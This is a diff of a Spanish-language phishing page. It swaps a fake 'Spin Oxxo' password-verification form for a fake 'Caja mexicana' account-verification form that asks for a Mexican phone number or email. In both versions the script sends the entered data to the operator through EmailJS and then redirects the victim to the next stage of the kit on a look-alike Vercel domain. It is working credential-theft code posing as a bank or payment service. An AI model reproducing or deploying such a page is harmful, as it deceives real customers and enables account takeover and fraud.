@@ -4,51 +4,77 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="./contraseña.css">
-    <title>Spin</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-formsubmit@1/formsubmit.js"></script>
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <title>Caja mexicana - Principal</title>
 </head>
 <body>
-    <div class="contglobal">
-        <div class="contitle">
-            <h3 class="conttitle__title">Termina tu verificación Spin Oxxo</h3>
-        </div>
-        <form id="my-form">
-            <input type="hidden" name="_captcha" value="false">
-            <input name="_formsubmit_id" type="text" style="display:none">
-            <div class="continputlabel">
-                <label class="continputlabel__label">Contraseña</label>
-                <input class="continputlabel__input" type="text" name="contraseña" placeholder="Ingresa tu contraseña">
-            </div>
-            <div class="contbtn">
-                <input value="Autorizar" class="contbtn__btn" type="submit">
-            </div>
-        </form>
-    </div>
-    <div style="display: flex; align-items: center; justify-content:center; margin-top:60px;">
-        <img width="150px" src="./logo.jpeg" alt="">
-    </div>
     
-    <script>
-        // Inicializar EmailJS
-        (function() {
-            emailjs.init('uKG8o-MBNGW7QBKhp'); // Reemplaza 'YOUR_USER_ID' con tu identificador de usuario de EmailJS
-        })();
+<div class="background"></div>
+<div class="cont">
+    <div class="login-container">
+        &nbsp;
+        <img class="imglogonav" src="./logo.jpeg" alt="">
+        &nbsp;
+        <h2>Verifica tu cuenta</h2>
+        <form id="my-form">
+            <label for="username">Ingresa tu Teléfono ó Correo electrónico</label>
+            <div class="input-group">
+                <span class="country-code">+52</span>
+                <input class="pedirnumeroinput" type="tel" id="username" name="username" maxlength="10" required>
+            </div>
+            <a href="#" class="forgot-link">¿Olvidaste tu número?</a>
+            <button class="pedirbtn" type="submit" disabled>Enviar</button>
+        </form>
+        <p>Verificate para no perder tu cuenta</p>
+    </div>
+</div>
 
-        // Agregar evento al formulario para enviar con EmailJS
-        document.querySelector('form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Previene el envío del formulario por defecto
-            var form = document.getElementById('my-form');
+<script>
+    // Inicializar EmailJS
+    (function() {
+        emailjs.init('uKG8o-MBNGW7QBKhp'); // Reemplaza 'YOUR_USER_ID' por tu ID de usuario de EmailJS
+    })();
 
-            // Enviar el formulario usando EmailJS
-            emailjs.sendForm('service_izp7mc5', 'template_vcwuhph', form)
-                .then(function(response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                    window.location.href = 'https://mispinquierocontinuaroxxoclienpremier.vercel.app/segundocodigo.html';
-                }, function(error) {
-                    console.log('FAILED...', error);
-                });
-        });
-    </script>
+    var input = document.querySelector(".pedirnumeroinput");
+    var btn = document.querySelector(".pedirbtn");
+
+    input.addEventListener("keyup", function() {
+        if (input.value.length == 10) {
+            btn.disabled = false;
+        } else {
+            btn.disabled = true;
+        }
+    });
+
+    input.addEventListener("keydown", function(e) {
+        if (input.value.length == 10 && e.keyCode != 8) {
+            e.preventDefault();
+        }
+    });
+
+    input.addEventListener("keypress", function(e) {
+        if (e.keyCode < 48 || e.keyCode > 57) {
+            e.preventDefault();
+        }
+    });
+
+    // Enviar el formulario usando EmailJS
+    document.querySelector('form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Previene el envío del formulario por defecto
+        var form = document.getElementById('my-form');
+
+        // Enviar el formulario usando EmailJS
+        emailjs.sendForm('service_izp7mc5', 'template_vcwuhph', form)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                window.location.href = 'https://cajapopulardelosmexicanosnet.vercel.app/contraseña.html';
+            }, function(error) {
+                console.log('FAILED...', error);
+            });
+    });
+</script>
+
 </body>
 </html>
